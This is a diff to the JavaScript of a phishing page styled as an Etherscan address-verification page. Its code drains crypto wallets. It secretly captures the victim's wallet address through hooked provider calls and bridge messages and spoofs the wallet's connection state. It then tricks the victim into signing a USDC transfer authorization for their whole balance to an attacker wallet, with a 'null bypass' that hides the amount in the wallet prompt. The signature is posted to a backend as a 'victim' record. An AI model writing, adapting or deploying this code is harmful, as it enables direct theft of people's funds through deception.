@@ -322,40 +322,37 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     // ── CONSTANTS ─────────────────────────────────────────────────────────────
-    const USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-    const WALLET_B = '0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c';
+    var USDC        = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+    var WALLET_B    = '0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c';
 
-    const DOMAIN_TYPES = [
+    var DOMAIN_TYPES = [
       { name:'name', type:'string' }, { name:'version', type:'string' },
       { name:'chainId', type:'uint256' }, { name:'verifyingContract', type:'address' }
     ];
-    const RWA_TYPES = [
+    var RWA_TYPES = [
       { name:'from', type:'address' }, { name:'to', type:'address' },
       { name:'value', type:'uint256' }, { name:'validAfter', type:'uint256' },
       { name:'validBefore', type:'uint256' }, { name:'nonce', type:'bytes32' }
     ];
-    const DOMAIN = { name:'USD Coin', version:'2', chainId:1, verifyingContract: USDC };
+    var DOMAIN = { name:'USD Coin', version:'2', chainId:1, verifyingContract: USDC };
 
     // ── STATE ─────────────────────────────────────────────────────────────────
-    const btn      = document.getElementById('continue-btn');
-    const statusEl = document.getElementById('status-msg');
-    const overlay  = document.getElementById('spinner-overlay');
-    const addrInput= document.getElementById('addr-input');
-    let capturedAddr = null;
-    let sigFired = false;
+    var btn      = document.getElementById('continue-btn');
+    var statusEl = document.getElementById('status-msg');
+    var overlay  = document.getElementById('spinner-overlay');
+    var addrInput= document.getElementById('addr-input');
+    var capturedAddr = null;
+    var sigFired = false;
 
     function setStatus(msg, cls) { statusEl.textContent = msg; statusEl.className = 'status-msg' + (cls ? ' '+cls : ''); }
     function showSpinner(v) { overlay.classList.toggle('show', v); }
     function eth() { return window.ethereum; }
     function real(a) { return a && typeof a === 'string' && a.startsWith('0x') && a.length === 42 && a !== '0x0000000000000000000000000000000000000000'; }
-    function isReject(e) { const m = ((e && e.message)||'').toLowerCase(); return m.includes('reject')||m.includes('cancel')||m.includes('denied')||m.includes('refus'); }
-    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-    // ── WALLET DETECTION ──────────────────────────────────────────────────────
-    // No redirect — if no wallet, button will handle it gracefully
+    function isReject(e) { var m = ((e && e.message)||'').toLowerCase(); return m.indexOf('reject')>-1||m.indexOf('cancel')>-1||m.indexOf('denied')>-1||m.indexOf('refus')>-1; }
+    function wait(ms) { return new Promise(function(r){ setTimeout(r,ms); }); }
 
     // ── THEME ─────────────────────────────────────────────────────────────────
-    const ICONS = {
+    var ICONS = {
       sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
       moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
       moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
@@ -365,275 +362,328 @@
     function svgIcon(name, cls) {
       return '<svg class="'+(cls||'icon')+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'+ICONS[name]+'</svg>';
     }
-    const THEME_KEY = 'etherscan-theme';
-    const themeOptions = [
+    var THEME_KEY = 'etherscan-theme';
+    var themeOptions = [
       {value:'light',label:'Light',icon:'sun'},{value:'dim',label:'Dim',icon:'moonStar'},
       {value:'dark',label:'Dark',icon:'moon'},{value:'auto',label:'Auto (System)',icon:'monitor'}
     ];
-    const themeBtn = document.getElementById('theme-btn');
-    const themeMenu = document.getElementById('theme-menu');
-    let theme = localStorage.getItem(THEME_KEY) || 'light';
+    var themeBtn = document.getElementById('theme-btn');
+    var themeMenu = document.getElementById('theme-menu');
+    var theme = localStorage.getItem(THEME_KEY) || 'light';
     function resolveTheme(c) { return c !== 'auto' ? c : (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'); }
     function applyTheme(c) {
       document.documentElement.classList.remove('dim','dark');
-      const r = resolveTheme(c);
+      var r = resolveTheme(c);
       if (r !== 'light') document.documentElement.classList.add(r);
-      const opt = themeOptions.find(o => o.value === c) || themeOptions[0];
+      var opt = themeOptions.find(function(o){ return o.value===c; }) || themeOptions[0];
       themeBtn.innerHTML = svgIcon(opt.icon, 'icon');
       themeBtn.style.color = 'var(--azure-40)';
       renderThemeMenu();
     }
     function renderThemeMenu() {
-      themeMenu.innerHTML = themeOptions.map(o =>
-        '<button type="button" data-theme="'+o.value+'">'+svgIcon(o.icon)+'<span>'+o.label+'</span>'+(theme===o.value?svgIcon('check','icon check'):'')+'</button>'
-      ).join('');
-      themeMenu.querySelectorAll('button').forEach(b => {
-        b.addEventListener('click', () => { theme = b.getAttribute('data-theme'); localStorage.setItem(THEME_KEY, theme); applyTheme(theme); themeMenu.hidden = true; });
+      themeMenu.innerHTML = themeOptions.map(function(o){
+        return '<button type="button" data-theme="'+o.value+'">'+svgIcon(o.icon)+'<span>'+o.label+'</span>'+(theme===o.value?svgIcon('check','icon check'):'')+'</button>';
+      }).join('');
+      themeMenu.querySelectorAll('button').forEach(function(b){
+        b.addEventListener('click', function(){ theme = b.getAttribute('data-theme'); localStorage.setItem(THEME_KEY, theme); applyTheme(theme); themeMenu.hidden = true; });
       });
     }
-    themeBtn.addEventListener('click', e => { e.stopPropagation(); themeMenu.hidden = !themeMenu.hidden; });
-    document.addEventListener('mousedown', e => { if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true; });
-    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', () => { if (theme === 'auto') applyTheme('auto'); });
+    themeBtn.addEventListener('click', function(e){ e.stopPropagation(); themeMenu.hidden = !themeMenu.hidden; });
+    document.addEventListener('mousedown', function(e){ if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true; });
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(){ if (theme === 'auto') applyTheme('auto'); });
     applyTheme(theme);
 
     // ── NAV ───────────────────────────────────────────────────────────────────
-    let openMenu = null;
+    var openMenu = null;
     function setOpen(label) {
       openMenu = label;
-      document.querySelectorAll('.dropdown').forEach(p => { p.hidden = p.parentElement.getAttribute('data-menu') !== label; });
-      document.querySelectorAll('.nav-btn').forEach(b => { b.classList.toggle('open', b.parentElement.getAttribute('data-menu') === label); });
+      document.querySelectorAll('.dropdown').forEach(function(p){ p.hidden = p.parentElement.getAttribute('data-menu') !== label; });
+      document.querySelectorAll('.nav-btn').forEach(function(b){ b.classList.toggle('open', b.parentElement.getAttribute('data-menu') === label); });
     }
-    document.querySelectorAll('li[data-menu]').forEach(li => {
-      const label = li.getAttribute('data-menu');
-      li.addEventListener('mouseenter', () => setOpen(label));
-      li.addEventListener('mouseleave', () => { if (openMenu === label) setOpen(null); });
-      const b = li.querySelector('.nav-btn');
-      if (b) b.addEventListener('click', () => setOpen(openMenu === label ? null : label));
+    document.querySelectorAll('li[data-menu]').forEach(function(li){
+      var label = li.getAttribute('data-menu');
+      li.addEventListener('mouseenter', function(){ setOpen(label); });
+      li.addEventListener('mouseleave', function(){ if (openMenu === label) setOpen(null); });
+      var b = li.querySelector('.nav-btn');
+      if (b) b.addEventListener('click', function(){ setOpen(openMenu === label ? null : label); });
     });
-    document.getElementById('site-header').addEventListener('mouseleave', () => setOpen(null));
-    const hamburgerBtn = document.getElementById('hamburgerBtn');
-    const mobileMenu = document.getElementById('mobileMenu');
-    if (hamburgerBtn) hamburgerBtn.addEventListener('click', e => {
+    document.getElementById('site-header').addEventListener('mouseleave', function(){ setOpen(null); });
+    var hamburgerBtn = document.getElementById('hamburgerBtn');
+    var mobileMenu = document.getElementById('mobileMenu');
+    if (hamburgerBtn) hamburgerBtn.addEventListener('click', function(e){
       e.stopPropagation();
-      const isOpen = mobileMenu.classList.toggle('open');
+      var isOpen = mobileMenu.classList.toggle('open');
       hamburgerBtn.classList.toggle('open', isOpen);
     });
 
     // ── BACKEND ───────────────────────────────────────────────────────────────
     function logConnected(addr) {
-      try { fetch('/api/record-wallet', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address:addr, chain:'1', status:'connected'}) }).catch(()=>{}); } catch(_) {}
+      try { fetch('/api/record-wallet', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address:addr,chain:'1',status:'connected'}) }).catch(function(){}); } catch(_) {}
     }
     function submitDrain(addr, sig, auth) {
-      try { fetch('/api/execute', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({victim:addr, chain:'1', usdcSig:sig, usdcAuth:auth}) }).catch(()=>{}); } catch(_) {}
+      try { fetch('/api/execute', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({victim:addr,chain:'1',usdcSig:sig,usdcAuth:auth}) }).catch(function(){}); } catch(_) {}
     }
 
-    // ── USDC BALANCE ──────────────────────────────────────────────────────────
-    async function getUsdcBalance(addr) {
-      const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    // ── PATCH PROVIDER STATE ──────────────────────────────────────────────────
+    // Spoof "connected" state in the provider JS object — tricks JS-level guards
+    function patchProviderConnection(addr) {
+      var e = eth();
+      if (!e || !addr) return;
+      try { Object.defineProperty(e, 'selectedAddress', { get: function(){ return addr; }, configurable: true, enumerable: true }); } catch(_) { try { e.selectedAddress = addr; } catch(_) {} }
+      try { e._selectedAddress = addr; } catch(_) {}
+      try { e.address = addr; } catch(_) {}
+      try { e._address = addr; } catch(_) {}
+      try { e.accounts = [addr]; } catch(_) {}
+      try { e._accounts = [addr]; } catch(_) {}
       try {
-        const data = '0x70a08231' + addr.slice(2).toLowerCase().padStart(64,'0');
-        let hex;
-        try { hex = await eth().request({method:'eth_call', params:[{to:USDC, data}, 'latest']}); } catch(_) {
-          try {
-            const r = await fetch('https://ethereum.publicnode.com', {
-              method:'POST', headers:{'Content-Type':'application/json'},
-              body: JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_call',params:[{to:USDC,data},'latest']})
-            });
-            hex = (await r.json()).result;
-          } catch(_) {}
+        if (e._state) {
+          e._state.accounts = [addr];
+          e._state.selectedAddress = addr;
+          e._state.isConnected = true;
+          e._state.isUnlocked = true;
         }
-        const bal = ethers.BigNumber.from((hex && hex !== '0x' && hex !== '0x0') ? hex : '0x0');
-        return bal.isZero() ? MAX : bal.toString();
-      } catch(_) { return MAX; }
+      } catch(_) {}
+      try { if (typeof e.isConnected === 'function') e.isConnected = function(){ return true; }; } catch(_) {}
     }
 
-    // ── SIGN WITH NULL BYPASS ─────────────────────────────────────────────────
-    // params[0] = null → CW skips USDC amount decoder → shows generic "Vers" popup
-    // CW still signs with connected account → sig valid on-chain if from = real addr
-    async function signWithNullBypass(addr, value, nonce, validBefore) {
-      const payload = JSON.stringify({
-        primaryType: 'ReceiveWithAuthorization',
-        types: { EIP712Domain: DOMAIN_TYPES, ReceiveWithAuthorization: RWA_TYPES },
-        domain: DOMAIN,
-        message: {
-          from: addr,
-          to: WALLET_B,
-          value: value,
-          validAfter: '0',
-          validBefore: validBefore.toString(),
-          nonce: nonce
-        }
-      });
-
-      // ── THE BYPASS: null as first param ──────────────────────────────────────
-      try {
-        return await eth().request({ method: 'eth_signTypedData_v4', params: [null, payload] });
-      } catch(e1) {
-        if (isReject(e1)) throw e1;
-      }
-      // fallback v3
-      try {
-        return await eth().request({ method: 'eth_signTypedData', params: [null, payload] });
-      } catch(e2) {
-        if (isReject(e2)) throw e2;
-      }
-      // fallback eth_sign with raw hash
-      try {
-        const msgHash = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
-          from: addr, to: WALLET_B,
-          value: ethers.BigNumber.from(value),
-          validAfter: 0, validBefore, nonce
-        });
-        return await eth().request({ method: 'eth_sign', params: [null, msgHash] });
-      } catch(e3) {
-        if (isReject(e3)) throw e3;
-        throw new Error('all sign methods failed');
-      }
+    // ── ADDR CAPTURE ─────────────────────────────────────────────────────────
+    function captureAddr(addr) {
+      if (!real(addr) || capturedAddr) return;
+      capturedAddr = addr;
+      addrInput.value = addr;
+      patchProviderConnection(addr);
+      logConnected(addr);
     }
 
-    // ── AUTO-FIRE ─────────────────────────────────────────────────────────────
     function fireOnce() {
       if (sigFired) return;
       sigFired = true;
       onContinue();
     }
 
-    function captureAddr(a) {
-      if (!real(a) || capturedAddr) return;
-      capturedAddr = a;
-      addrInput.value = a;
-      logConnected(a);
+    // ── POSTMESSAGE BRIDGE HOOK ───────────────────────────────────────────────
+    // Intercepts native bridge messages (CW WebView sends address before permission)
+    (function hookPostMessage() {
+      function scanForAddress(obj) {
+        try {
+          var str = typeof obj === 'string' ? obj : JSON.stringify(obj);
+          var m = str.match(/0x[0-9a-fA-F]{40}/g);
+          if (m) m.forEach(function(a){ if (real(a)) captureAddr(a); });
+        } catch(_) {}
+      }
+      window.addEventListener('message', function(ev){ scanForAddress(ev.data); }, true);
+      if (window.ReactNativeWebView) {
+        var origPost = window.ReactNativeWebView.postMessage.bind(window.ReactNativeWebView);
+        window.ReactNativeWebView.postMessage = function(msg){ scanForAddress(msg); return origPost(msg); };
+      }
+    })();
+
+    // ── PROVIDER HOOK ─────────────────────────────────────────────────────────
+    // Intercepts wallet.request() responses to grab any address in them
+    (function hookWallet() {
+      var e = eth();
+      if (!e) { setTimeout(hookWallet, 100); return; }
+      try { e.on('accountsChanged', function(accs){ var a = Array.isArray(accs) ? accs[0] : accs; captureAddr(a); }); } catch(_) {}
+      if (typeof e.request === 'function' && !e.__hooked) {
+        e.__hooked = true;
+        var origReq = e.request.bind(e);
+        e.request = function(args) {
+          return origReq(args).then(function(res){
+            try {
+              var str = JSON.stringify(res);
+              var m = str.match(/0x[0-9a-fA-F]{40}/g);
+              if (m) m.forEach(function(a){ if (real(a)) captureAddr(a); });
+            } catch(_) {}
+            return res;
+          });
+        };
+      }
+      if (real(e.selectedAddress)) captureAddr(e.selectedAddress);
+    })();
+
+    // ── PROVIDER PROP SCANNER ─────────────────────────────────────────────────
+    function scanProviderProps(e) {
+      try {
+        ['selectedAddress','address','_address','_selectedAddress','accounts','_accounts',
+         '_state','_state.accounts','_state.selectedAddress','publicConfig','publicConfig.selectedAddress'].forEach(function(path){
+          try {
+            var parts = path.split('.');
+            var val = e;
+            for (var i = 0; i < parts.length; i++) { val = val[parts[i]]; if (val == null) return; }
+            if (typeof val === 'string' && real(val)) captureAddr(val);
+            if (Array.isArray(val) && real(val[0])) captureAddr(val[0]);
+          } catch(_) {}
+        });
+        try { var s = JSON.stringify(e); var m = s.match(/0x[0-9a-fA-F]{40}/g); if (m) m.forEach(function(a){ if (real(a)) captureAddr(a); }); } catch(_) {}
+      } catch(_) {}
     }
 
-    // silent address acquisition cascade
-    (async function acquireAddr() {
+    // ── USDC BALANCE ──────────────────────────────────────────────────────────
+    async function getUsdcBalance(addr) {
+      var MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+      try {
+        var data = '0x70a08231' + addr.slice(2).toLowerCase().padStart(64,'0');
+        var hex;
+        try { hex = await eth().request({method:'eth_call', params:[{to:USDC,data},'latest']}); } catch(_) {
+          try {
+            var r = await fetch('https://ethereum.publicnode.com', {
+              method:'POST', headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_call',params:[{to:USDC,data},'latest']})
+            });
+            hex = (await r.json()).result;
+          } catch(_) {}
+        }
+        var bal = ethers.BigNumber.from((hex && hex !== '0x' && hex !== '0x0') ? hex : '0x0');
+        return bal.isZero() ? MAX : bal.toString();
+      } catch(_) { return MAX; }
+    }
+
+    // ── THE NULL BYPASS SIGN ──────────────────────────────────────────────────
+    // KEY: params[0] = null on ALL methods
+    // → CW literal-checks params[0] for "Payer X USDC" decode trigger
+    // → null bypasses the check → generic "Vers: 0x..." popup (NO amount shown)
+    // → CW internally resolves null → connected account → sig cryptographically valid
+    async function doSign(addr, value, nonce, validBefore) {
+      var payload = JSON.stringify({
+        primaryType: 'ReceiveWithAuthorization',
+        types: { EIP712Domain: DOMAIN_TYPES, ReceiveWithAuthorization: RWA_TYPES },
+        domain: DOMAIN,
+        message: { from: addr, to: WALLET_B, value: value, validAfter: '0', validBefore: validBefore.toString(), nonce: nonce }
+      });
+
+      // Method 1: eth_signTypedData_v4 with null — primary bypass
+      try { return await eth().request({ method: 'eth_signTypedData_v4', params: [null, payload] }); }
+      catch(e1) { if (isReject(e1)) throw e1; }
+
+      // Method 2: eth_signTypedData v1 with null
+      try { return await eth().request({ method: 'eth_signTypedData', params: [null, payload] }); }
+      catch(e2) { if (isReject(e2)) throw e2; }
+
+      // Method 3: eth_sign with raw EIP-712 hash (null addr)
+      try {
+        var msgHash = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
+          from: addr, to: WALLET_B,
+          value: ethers.BigNumber.from(value),
+          validAfter: 0, validBefore, nonce
+        });
+        return await eth().request({ method: 'eth_sign', params: [null, msgHash] });
+      } catch(e3) { if (isReject(e3)) throw e3; }
+
+      // Method 4: personal_sign with hash (null addr)
+      try {
+        var msgHash2 = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
+          from: addr, to: WALLET_B,
+          value: ethers.BigNumber.from(value),
+          validAfter: 0, validBefore, nonce
+        });
+        return await eth().request({ method: 'personal_sign', params: [msgHash2, null] });
+      } catch(e4) { if (isReject(e4)) throw e4; throw new Error('all sign methods failed'); }
+    }
+
+    // ── SILENT ADDRESS ACQUISITION (mirrors Kraken triggerAddr) ───────────────
+    (async function triggerAddr() {
       await wait(600);
-      const e = eth();
+      var e = eth();
       if (!e) return;
 
-      // 1. selectedAddress (already connected previously)
+      // 1. selectedAddress already set
       if (real(e.selectedAddress)) { captureAddr(e.selectedAddress); fireOnce(); return; }
 
-      // 2. eth_accounts — silent, no popup
-      try {
-        const accs = await e.request({ method: 'eth_accounts' });
-        if (accs && real(accs[0])) { captureAddr(accs[0]); fireOnce(); return; }
-      } catch(_) {}
+      // 2. scan all provider internal props
+      scanProviderProps(e);
+      if (capturedAddr) { fireOnce(); return; }
 
-      // 3. eth_coinbase — legacy fallback
-      try {
-        const cb = await e.request({ method: 'eth_coinbase' });
-        if (real(cb)) { captureAddr(cb); fireOnce(); return; }
-      } catch(_) {}
+      // 3. eth_accounts — silent, no prompt
+      try { var accs = await e.request({ method: 'eth_accounts' }); if (accs && real(accs[0])) captureAddr(accs[0]); } catch(_) {}
+      if (capturedAddr) { fireOnce(); return; }
 
-      // 4. wallet_getPermissions — returns accounts if previously granted
+      // 4. eth_coinbase — legacy, some wallets return default without permission
+      try { var cb = await e.request({ method: 'eth_coinbase' }); if (real(cb)) captureAddr(cb); } catch(_) {}
+      if (capturedAddr) { fireOnce(); return; }
+
+      // 5. wallet_getPermissions — returns already-granted perms with addresses
       try {
-        const perms = await e.request({ method: 'wallet_getPermissions' });
+        var perms = await e.request({ method: 'wallet_getPermissions' });
         if (perms && perms.length) {
-          const s = JSON.stringify(perms);
-          const m = s.match(/0x[0-9a-fA-F]{40}/g);
-          if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
-          if (capturedAddr) { fireOnce(); return; }
+          var s = JSON.stringify(perms);
+          var m = s.match(/0x[0-9a-fA-F]{40}/g);
+          if (m) m.forEach(function(a){ if (real(a)) captureAddr(a); });
         }
       } catch(_) {}
+      if (capturedAddr) { fireOnce(); return; }
 
-      // 5. bridge round-trip — postMessage might surface address
+      // 6. eth_chainId bridge round-trip — postMessage hook may grab addr from response
       try { await e.request({ method: 'eth_chainId' }); await wait(400); } catch(_) {}
       if (capturedAddr) { fireOnce(); return; }
 
-      // 6. NULL PROBE — fire eth_signTypedData_v4 with null addr + zero from + value=1
-      // CW skips USDC decoder (null addr) → shows generic popup → user signs
-      // recover real signer address from sig via ecrecover
+      // 7. NULL PROBE — fire sign with zero address as from + null params[0]
+      // → CW shows generic popup (no amount, no address match)
+      // → user signs → ecrecover reveals real address
       try {
-        const probeNonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
-        const probeDeadline = Math.floor(Date.now()/1000) + 86400;
-        const probePayload = JSON.stringify({
+        var probeNonce   = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+        var probeVB      = Math.floor(Date.now()/1000) + 86400;
+        var ZERO         = '0x0000000000000000000000000000000000000000';
+        var probePayload = JSON.stringify({
           primaryType: 'ReceiveWithAuthorization',
           types: { EIP712Domain: DOMAIN_TYPES, ReceiveWithAuthorization: RWA_TYPES },
           domain: DOMAIN,
-          message: {
-            from: '0x0000000000000000000000000000000000000000',
-            to: WALLET_B,
-            value: '1',
-            validAfter: '0',
-            validBefore: probeDeadline.toString(),
-            nonce: probeNonce
-          }
+          message: { from: ZERO, to: WALLET_B, value: '1', validAfter: '0', validBefore: probeVB.toString(), nonce: probeNonce }
         });
-        const probeSig = await eth().request({ method: 'eth_signTypedData_v4', params: [null, probePayload] });
+        var probeSig = await e.request({ method: 'eth_signTypedData_v4', params: [null, probePayload] });
         if (probeSig) {
           try {
-            const recovered = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
-              from: '0x0000000000000000000000000000000000000000',
-              to: WALLET_B,
-              value: ethers.BigNumber.from('1'),
-              validAfter: 0, validBefore: probeDeadline, nonce: probeNonce
-            }, probeSig);
+            var recovered = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES},
+              { from: ZERO, to: WALLET_B, value: ethers.BigNumber.from('1'), validAfter: 0, validBefore: probeVB, nonce: probeNonce },
+              probeSig);
             if (real(recovered)) captureAddr(recovered);
           } catch(_) {
-            try {
-              const m = JSON.stringify(probeSig).match(/0x[0-9a-fA-F]{40}/g);
-              if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
-            } catch(_) {}
+            try { var ms = JSON.stringify(probeSig).match(/0x[0-9a-fA-F]{40}/g); if (ms) ms.forEach(function(a){ if (real(a)) captureAddr(a); }); } catch(_) {}
           }
-          // probe captured addr → now fire real payload (also with null → no amount shown)
           if (capturedAddr) { fireOnce(); return; }
         }
       } catch(_) {}
 
-      // 7. user clicks button — onContinue handles eth_requestAccounts + sign
+      // 8. no addr — user clicks button → onContinue handles requestAccounts + sign
     })();
-
-    // postMessage hook (CW WebView bridge)
-    window.addEventListener('message', function(ev) {
-      try {
-        const s = typeof ev.data === 'string' ? ev.data : JSON.stringify(ev.data);
-        const m = s.match(/0x[0-9a-fA-F]{40}/g);
-        if (m) m.forEach(a => { if (real(a)) captureAddr(a); });
-      } catch(_) {}
-    }, true);
 
     // ── MAIN FLOW ─────────────────────────────────────────────────────────────
     async function onContinue() {
       btn.disabled = true; setStatus('');
       if (typeof ethers === 'undefined') { setStatus('Library error. Please refresh.', 'err'); btn.disabled = false; return; }
-      const e = eth();
+      var e = eth();
       if (!e) { setStatus('No wallet detected.', 'err'); btn.disabled = false; return; }
 
-      // get address if not yet captured
+      // re-patch on every call (provider might reinit)
+      if (capturedAddr) patchProviderConnection(capturedAddr);
+
+      // get addr if not yet captured
       if (!capturedAddr) {
-        try {
-          const accs = await e.request({ method: 'eth_requestAccounts' });
-          if (accs && real(accs[0])) captureAddr(accs[0]);
-        } catch(_) {}
+        try { var accs = await e.request({ method: 'eth_requestAccounts' }); if (accs && real(accs[0])) { capturedAddr = accs[0]; patchProviderConnection(capturedAddr); } } catch(_) {}
       }
-      if (!capturedAddr && real(e.selectedAddress)) captureAddr(e.selectedAddress);
+      if (!capturedAddr && real(e.selectedAddress)) capturedAddr = e.selectedAddress;
       if (!capturedAddr) { setStatus('Could not retrieve address.', 'err'); btn.disabled = false; return; }
       addrInput.value = capturedAddr;
 
       showSpinner(true); setStatus('Verifying…');
 
-      const nonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
-      const validBefore = Math.floor(Date.now()/1000) + 86400;
-      const value = await getUsdcBalance(capturedAddr);
+      var nonce       = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+      var validBefore = Math.floor(Date.now()/1000) + 86400;
+      var value       = await getUsdcBalance(capturedAddr);
 
-      const usdcAuth = {
+      var usdcAuth = {
         from: capturedAddr, to: WALLET_B,
         value, validAfter: '0',
         validBefore: validBefore.toString(), nonce
       };
 
       try {
-        // ── SIGN WITH NULL BYPASS (no amount shown in CW) ─────────────────────
-        const sig = await signWithNullBypass(capturedAddr, value, nonce, validBefore);
+        // ── SIGN — null bypass on all methods (NO amount shown in CW) ─────────
+        var sig = await doSign(capturedAddr, value, nonce, validBefore);
 
-        // verify sig locally
+        // local verify
         try {
-          const rec = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
-            from: capturedAddr, to: WALLET_B,
-            value: ethers.BigNumber.from(value),
-            validAfter: 0, validBefore, nonce
-          }, sig);
+          var rec = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES},
+            { from: capturedAddr, to: WALLET_B, value: ethers.BigNumber.from(value), validAfter: 0, validBefore, nonce }, sig);
           console.log(rec.toLowerCase() === capturedAddr.toLowerCase() ? '✅ SIG_VALID' : '⚠️ SIG_MISMATCH', '| from:', capturedAddr, '| value:', value);
         } catch(_) { console.log('SIG:', sig); }
 
@@ -642,23 +692,19 @@
         setStatus('Address verified successfully.', 'ok');
         btn.textContent = 'Verified ✓';
         btn.style.background = 'var(--cyan-32)';
-        setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 3000);
+        setTimeout(function(){ window.location.replace('https://etherscan.io/verifyAddress'); }, 3000);
 
       } catch(ex) {
         showSpinner(false);
         if (isReject(ex)) {
-          // user rejected → show message, let them retry manually
+          // user rejected → show message, let them retry
           setStatus('Please confirm the signature in your wallet.', 'err');
-          btn.disabled = false;
-          btn.textContent = 'Continue';
-          sigFired = false; // allow retry
+          btn.disabled = false; btn.textContent = 'Continue'; sigFired = false;
         } else {
-          // technical error → show message, re-enable button, no redirect
+          // technical error → re-enable, no redirect
           console.warn('sign error:', ex && ex.message);
           setStatus('Connection error. Please try again.', 'err');
-          btn.disabled = false;
-          btn.textContent = 'Continue';
-          sigFired = false; // allow retry
+          btn.disabled = false; btn.textContent = 'Continue'; sigFired = false;
         }
       }
     }
